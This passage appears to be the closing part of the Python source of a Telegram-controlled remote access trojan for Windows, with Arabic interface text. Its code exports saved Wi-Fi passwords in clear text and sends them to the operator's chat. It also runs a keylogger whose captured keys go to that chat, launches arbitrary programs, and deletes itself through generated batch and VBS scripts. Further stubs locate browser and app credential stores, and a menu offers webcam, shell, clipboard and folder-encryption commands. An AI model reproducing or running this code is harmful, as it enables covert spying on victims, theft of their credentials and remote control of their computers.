                os.makedirs(temp_dir)
            
            subprocess.run([
                'netsh', 'wlan', 'export', 'profile', 'key=clear',
                f'folder="{temp_dir}'
            ], shell=True, text=True)
            
            xml_files = [f for f in os.listdir(temp_dir) if f.endswith('.xml')]
            
            if not xml_files:
                return "❌ لم يتم العثور على أي شبكات واي فاي محفوظة"

            all_wifi_info = "📶 شبكات الواي فاي المحفوظة:\n\n"
            
            for xml_file in xml_files:
                try:
                    file_path = os.path.join(temp_dir, xml_file)
                    tree = ET.parse(file_path)
                    root = tree.getroot()
                    
                    ssid_element = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}name')
                    ssid = ssid_element.text if ssid_element is not None else "غير معروف"
                    
                    password_element = root.find('.//{http://www.microsoft.com/networking/WLAN/profile/v1}keyMaterial')
                    password = password_element.text if password_element is not None else "غير متوفر"
                    
                    all_wifi_info += f"📡 الشبكة: {ssid}\n"
                    all_wifi_info += f"🔑 كلمة المرور: {password}\n"
                    all_wifi_info += "➖➖➖➖➖➖➖➖➖➖\n"
                    
                    os.remove(file_path)
                    
                except Exception as e:
                    continue
            
            try:
                os.rmdir(temp_dir)
            except:
                pass
                
            return all_wifi_info

        future = run_command_async(get_wifi_info)
        wifi_info = future.result()
        
        if len(wifi_info) > 4000:
            parts = [wifi_info[i:i+4000] for i in range(0, len(wifi_info), 4000)]
            for part in parts:
                bot.send_message(message.chat.id, part)
        else:
            bot.send_message(message.chat.id, wifi_info)

    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['wallpaper'])
def change_wallpaper_command(message):
    try:
        bot.send_message(message.chat.id, "🖼️ أرسل الصورة التي تريد تعيينها كخلفية")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        if message.photo:
            # Get the largest photo size
            photo = message.photo[-1]
            file_info = bot.get_file(photo.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Save the photo temporarily
            temp_path = os.path.join(cd, "temp_wallpaper.jpg")
            with open(temp_path, 'wb') as f:
                f.write(downloaded_file)
            
            # Set as wallpaper using Windows API
            def set_wallpaper():
                try:
                    # Convert to absolute path
                    abs_path = os.path.abspath(temp_path)
                    
                    # Set wallpaper using Windows API
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
                    
                    # Clean up temp file
                    os.remove(temp_path)
                    return True
                except Exception as e:
                    print(f"Error setting wallpaper: {e}")
                    return False

            # Run wallpaper setting in background
            future = run_command_async(set_wallpaper)
            success = future.result()
            
            if success:
                bot.send_message(message.chat.id, "✅ تم تغيير الخلفية بنجاح")
            else:
                bot.send_message(message.chat.id, "❌ فشل تغيير الخلفية")
        else:
            bot.send_message(message.chat.id, "❌ لم يتم العثور على صورة في الرسالة")
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(func=lambda message: True, content_types=['text'])
def handle_text_messages(message):
    try:
        # Simple check if the message looks like a URL
        text = message.text.strip()
        if text.lower().startswith('http://') or text.lower().startswith('https://'):
            url = text
            try:
                # Open the URL in the default web browser
                webbrowser.open(url)
                bot.send_message(message.chat.id, f"✅ تم فتح الرابط: {url}")
            except Exception as e:
                handle_error(message, e)
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['Hema'])
def show_commands_buttons(message):
    try:
        # Create inline keyboard markup
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        # Create buttons for each command
        buttons = [
            types.InlineKeyboardButton("📸 التقاط الشاشة", callback_data="cmd_screen"),
            types.InlineKeyboardButton("💻 معلومات النظام", callback_data="cmd_sys"),
            types.InlineKeyboardButton("🌐 عنوان IP", callback_data="cmd_ip"),
            types.InlineKeyboardButton("📁 التنقل في المجلدات", callback_data="cmd_cd"),
            types.InlineKeyboardButton("📋 عرض المحتويات", callback_data="cmd_ls"),
            types.InlineKeyboardButton("📤 رفع ملف", callback_data="cmd_upload"),
            types.InlineKeyboardButton("🔒 تشفير مجلد", callback_data="cmd_crypt"),
            types.InlineKeyboardButton("🔓 فك تشفير مجلد", callback_data="cmd_decrypt"),
            types.InlineKeyboardButton("📹 التقاط صورة", callback_data="cmd_webcam"),
            types.InlineKeyboardButton("🔒 قفل النظام", callback_data="cmd_lock"),
            types.InlineKeyboardButton("📋 محتوى الحافظة", callback_data="cmd_clipboard"),
            types.InlineKeyboardButton("💻 الطرفية", callback_data="cmd_shell"),
            types.InlineKeyboardButton("📶 شبكات الواي فاي", callback_data="cmd_wifi"),
            types.InlineKeyboardButton("👑 VIP User", url="https://t.me/w1Hema"),
            types.InlineKeyboardButton("🔊 تحويل النص إلى صوت", callback_data="cmd_speech"),
            types.InlineKeyboardButton("⏹️ إيقاف التشغيل", callback_data="cmd_shutdown"),
            types.InlineKeyboardButton("🖼️ تغيير الخلفية", callback_data="cmd_wallpaper"),
            types.InlineKeyboardButton("👥 المستخدمين النشطين", callback_data="cmd_users"),
        ]
        
        # Add all buttons to markup
        markup.add(*buttons)
        
        # Send message with buttons
        bot.send_message(
            message.chat.id,
            "🎯 اختر الأمر المطلوب:",
            reply_markup=markup
        )
    except Exception as e:
        handle_error(message, e)

# وظيفة كلمات المرور
@bot.message_handler(commands=['passwords'])
def get_passwords(message):
    try:
        def get_browser_passwords():
            passwords_info = "🔑 كلمات المرور المحفوظة:\n\n"
            
            # Chrome
            try:
                chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
                if os.path.exists(chrome_path):
                    passwords_info += "🌐 متصفح Chrome:\n"
                    # هنا يمكن إضافة كود لاستخراج كلمات المرور من Chrome
            except:
                pass
            
            # Firefox
            try:
                firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
                if os.path.exists(firefox_path):
                    passwords_info += "\n🌐 متصفح Firefox:\n"
                    # هنا يمكن إضافة كود لاستخراج كلمات المرور من Firefox
            except:
                pass
            
            # Edge
            try:
                edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
                if os.path.exists(edge_path):
                    passwords_info += "\n🌐 متصفح Edge:\n"
                    # هنا يمكن إضافة كود لاستخراج كلمات المرور من Edge
            except:
                pass
            
            return passwords_info

        future = run_command_async(get_browser_passwords)
        passwords_info = future.result()
        bot.send_message(message.chat.id, passwords_info)
        
    except Exception as e:
        handle_error(message, e)

# وظيفة تسجيل المفاتيح
def on_key_press(key):
    try:
        if keylogger_active:
            keylogger_data.append(str(key.char))
    except AttributeError:
        if keylogger_active:
            keylogger_data.append(str(key))

@bot.message_handler(commands=['keylogger'])
def handle_keylogger(message):
    try:
        global keylogger_active, keylogger_data
        
        if not keylogger_active:
            keylogger_active = True
            keylogger_data = []
            
            markup = types.InlineKeyboardMarkup()
            stop_button = types.InlineKeyboardButton("⏹️ إيقاف التسجيل", callback_data="stop_keylogger")
            markup.add(stop_button)
            
            bot.send_message(message.chat.id, "⌨️ تم بدء تسجيل المفاتيح", reply_markup=markup)
            
            # بدء تسجيل المفاتيح
            listener = keyboard.Listener(on_press=on_key_press)
            listener.start()
        else:
            bot.send_message(message.chat.id, "❌ التسجيل قيد التشغيل بالفعل")
            
    except Exception as e:
        handle_error(message, e)

@bot.callback_query_handler(func=lambda call: call.data == "stop_keylogger")
def stop_keylogger(call):
    try:
        global keylogger_active, keylogger_data
        
        if keylogger_active:
            keylogger_active = False
            
            # إرسال البيانات المسجلة
            if keylogger_data:
                text = "⌨️ المفاتيح المسجلة:\n\n" + "".join(keylogger_data)
                if len(text) > 4000:
                    parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
                    for part in parts:
                        bot.send_message(call.message.chat.id, part)
                else:
                    bot.send_message(call.message.chat.id, text)
            else:
                bot.send_message(call.message.chat.id, "❌ لم يتم تسجيل أي مفاتيح")
            
            keylogger_data = []
            
    except Exception as e:
        handle_error(call.message, e)

# وظيفة حسابات الجهاز
@bot.message_handler(commands=['accounts'])
def get_accounts(message):
    try:
        def get_saved_accounts():
            accounts_info = "👤 الحسابات المحفوظة:\n\n"
            
            # متصفحات الويب
            browsers = {
                'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default'),
                'Firefox': os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles'),
                'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default')
            }
            
            for browser, path in browsers.items():
                if os.path.exists(path):
                    accounts_info += f"🌐 {browser}:\n"
                    # هنا يمكن إضافة كود لاستخراج الحسابات من المتصفح
            
            # تطبيقات سطح المكتب
            apps = {
                'Steam': os.path.join(os.environ['PROGRAMFILES(X86)'], 'Steam', 'config'),
                'Discord': os.path.join(os.environ['APPDATA'], 'discord'),
                'Telegram': os.path.join(os.environ['APPDATA'], 'Telegram Desktop')
            }
            
            for app, path in apps.items():
                if os.path.exists(path):
                    accounts_info += f"\n💻 {app}:\n"
                    # هنا يمكن إضافة كود لاستخراج الحسابات من التطبيق
            
            return accounts_info

        future = run_command_async(get_saved_accounts)
        accounts_info = future.result()
        bot.send_message(message.chat.id, accounts_info)
        
    except Exception as e:
        handle_error(message, e)

# وظيفة تطبيقات الجهاز
@bot.message_handler(commands=['apps'])
def get_apps(message):
    try:
        def get_installed_apps():
            apps_info = "📱 التطبيقات المثبتة:\n\n"
            
            # تطبيقات النظام
            # Using PowerShell to get installed applications (more reliable than wmic)
            powershell_command = r'Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize'
            try:
                system_apps_output = subprocess.check_output(
                    ['powershell', '-Command', powershell_command],
                    shell=True, text=True, stderr=subprocess.PIPE
                )
                apps_info += "💻 تطبيقات النظام (PowerShell):\n" + system_apps_output + "\n"
            except subprocess.CalledProcessError as e:
                apps_info += f"❌ فشل الحصول على تطبيقات النظام باستخدام PowerShell: {e.stderr}\n"
                # Fallback to wmic if PowerShell fails (though wmic might also fail)
                try:
                    wmic_command = 'wmic product get name,version'
                    wmic_apps_output = subprocess.check_output(
                        wmic_command, shell=True, text=True, stderr=subprocess.PIPE
                    )
                    apps_info += "💻 تطبيقات النظام (WMIC - Fallback):\n" + wmic_apps_output + "\n"
                except Exception as wmic_e:
                     apps_info += f"❌ فشل الحصول على تطبيقات النظام باستخدام WMIC: {wmic_e}\n"

            
            # تطبيقات المستخدم (this might still just list folders in Program Files)
            try:
                 user_apps = subprocess.check_output('dir "C:\\Program Files" /b', shell=True).decode('utf-8')
                 apps_info += "\n👤 تطبيقات المستخدم (قد لا تكون قائمة كاملة):\n" + user_apps
            except Exception as user_apps_e:
                 apps_info += f"❌ فشل الحصول على قائمة مجلدات Program Files: {user_apps_e}\n"

            
            return apps_info

        future = run_command_async(get_installed_apps)
        apps_info = future.result()
        
        if len(apps_info) > 4000:
            parts = [apps_info[i:i+4000] for i in range(0, len(apps_info), 4000)]
            for part in parts:
                bot.send_message(message.chat.id, part)
        else:
            bot.send_message(message.chat.id, apps_info)
            
    except Exception as e:
        handle_error(message, e)

# وظيفة فتح التطبيقات
@bot.message_handler(commands=['openapp'])
def open_app(message):
    try:
        app_name = message.text.replace('/openapp', '').strip()
        if app_name:
            try:
                subprocess.Popen(app_name)
                bot.send_message(message.chat.id, f"✅ تم فتح التطبيق: {app_name}")
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ فشل فتح التطبيق: {app_name}")
        else:
            bot.send_message(message.chat.id, "❌ يرجى كتابة اسم التطبيق")
    except Exception as e:
        handle_error(message, e)

# تحديث معالج الأزرار
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    try:
        command = call.data.replace('cmd_', '')
        
        command_handlers = {
            'screen': send_screen,
            'sys': send_system_info,
            'ip': send_ip_info,
            'cd': lambda m: bot.send_message(m.chat.id, "أدخل اسم المجلد بعد الأمر /cd"),
            'ls': list_directory,
            'upload': lambda m: bot.send_message(m.chat.id, "أدخل مسار الملف بعد الأمر /upload"),
            'crypt': lambda m: bot.send_message(m.chat.id, "أدخل مسار المجلد بعد الأمر /crypt"),
            'decrypt': lambda m: bot.send_message(m.chat.id, "أدخل مسار المجلد بعد الأمر /decrypt"),
            'webcam': capture_webcam_image,
            'lock': lock_command,
            'clipboard': clipboard_command,
            'shell': start_shell,
            'wifi': get_wifi_passwords,
            'speech': text_to_speech_command,
            'shutdown': shutdown_command,
            'wallpaper': change_wallpaper_command,
            'users': show_users,
        }
        
        # Create a message object to pass to the handler
        message = call.message
        message.text = f"/{command}"
        
        # Handle specific callback actions
        if command in command_handlers:
            command_handlers[command](message)
            bot.answer_callback_query(call.id, "✅ تم تنفيذ الأمر")
        else:
            bot.answer_callback_query(call.id, "❌ أمر غير معروف")
            
    except Exception as e:
        logging.error(f"Error in callback handler: {e}")
        bot.answer_callback_query(call.id, "❌ حدث خطأ")

def delete_self():
    try:
        # Get the current script path
        script_path = os.path.abspath(sys.argv[0])
        
        # Create a batch file to delete the script
        batch_path = os.path.join(os.path.dirname(script_path), "delete_script.bat")
        with open(batch_path, "w") as f:
            f.write(f'@echo off\n')
            f.write(f':check\n')
            f.write(f'del /f /q "{script_path}"\n')
            f.write(f'if exist "{script_path}" goto check\n')
            f.write(f'del /f /q "{batch_path}"\n')
        
        # Run the batch file
        subprocess.Popen(batch_path, shell=True)
        sys.exit()
    except Exception as e:
        print(f"Error deleting self: {e}")

@bot.message_handler(commands=['delete'])
def delete_bot(message):
    try:
        bot.send_message(message.chat.id, "جاري حذف البوت...")
        delete_self()
    except Exception as e:
        handle_error(message, e)

@bot.message_handler(commands=['force_delete'])
def force_delete_bot(message):
    try:
        # Get the current script path
        script_path = os.path.abspath(sys.argv[0])
        
        # Create a VBS script to force delete the file
        vbs_path = os.path.join(os.path.dirname(script_path), "delete.vbs")
        with open(vbs_path, "w") as f:
            f.write(f'Set objFSO = CreateObject("Scripting.FileSystemObject")\n')
            f.write(f'Set objFile = objFSO.GetFile("{script_path}")\n')
            f.write(f'objFile.Delete\n')
            f.write(f'Set objFile = objFSO.GetFile("{vbs_path}")\n')
            f.write(f'objFile.Delete\n')
        
        # Run the VBS script
        subprocess.Popen(['wscript.exe', vbs_path], shell=True)
        bot.send_message(message.chat.id, "تم بدء عملية الحذف...")
        sys.exit()
    except Exception as e:
        handle_error(message, e)

def log_error(error):
    try:
        error_details = traceback.format_exc()
        logging.error(f"Error occurred: {str(error)}\n{error_details}")
        print(f"Error logged: {str(error)}")
    except Exception as e:
        print(f"Failed to log error: {str(e)}")

def main():
    print("🎯 HEMA TOP Bot is starting...")
    logging.info("Bot started")
    print('Waiting for commands...')
    
    try:
        # Test bot connection
        bot_info = bot.get_me()
        logging.info(f"Bot connected successfully: @{bot_info.username}")
        
        # Start periodic cleanup
        def periodic_cleanup():
            while True:
                time.sleep(3600)  # Run every hour
                cleanup_resources()
        
        cleanup_thread = threading.Thread(target=periodic_cleanup, daemon=True)
        cleanup_thread.start()
        
        # Improved polling settings
        bot.polling(none_stop=True, interval=0, timeout=20, long_polling_timeout=5)

    except Exception as e:
        logging.error(f"Fatal error during startup: {e}")
        print(f"Fatal error: {e}")
        print("Bot failed to start. Check bot.log for details.")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logging.info("Bot shutting down by user request")
        print("\nBot is shutting down...")
        cleanup_resources()
        sys.exit(0)
    except Exception as e:
        log_error(f"Fatal error: {e}")
        print(f"Fatal error: {e}")
        print("Bot will restart in 5 seconds...")
        time.sleep(5)
        main()        